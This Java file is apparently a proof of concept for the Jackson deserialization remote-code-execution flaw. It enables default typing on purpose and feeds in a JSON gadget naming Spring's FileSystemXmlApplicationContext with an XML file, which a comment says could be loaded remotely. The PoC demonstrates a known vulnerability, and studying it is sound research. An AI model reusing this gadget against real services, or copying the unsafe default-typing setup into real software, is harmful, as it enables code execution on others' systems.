package org.zh3feng.poc.jackson;

import java.io.IOException;

import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * @author ZH3FENG
 * @date 2018-01-11 09:02:01
 * @description A simplified PoC modified from irsl--https://github.com/irsl
 * @see https://github.com/irsl/jackson-rce-via-spel
 *
 */
public class App 
{
	

    //Note: For simplicity, here spel.xml is from local project, but indeed it can come from remote.
    //That's what irsl's PoC demonstrating.
   
    private static final String JSON_STRING = "{\"id\":123, \"obj\": [\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"spel.xml\"]}";
	
    public static void main( String[] args ) throws JsonParseException, JsonMappingException, IOException
    {
      	System.out.println("creating objectmapper");
	ObjectMapper objMapper = new ObjectMapper();
		
	objMapper.enableDefaultTyping();
		
	objMapper.readValue(JSON_STRING.getBytes(), SimpleBean.class);
		
	System.out.println("done");
    }
}
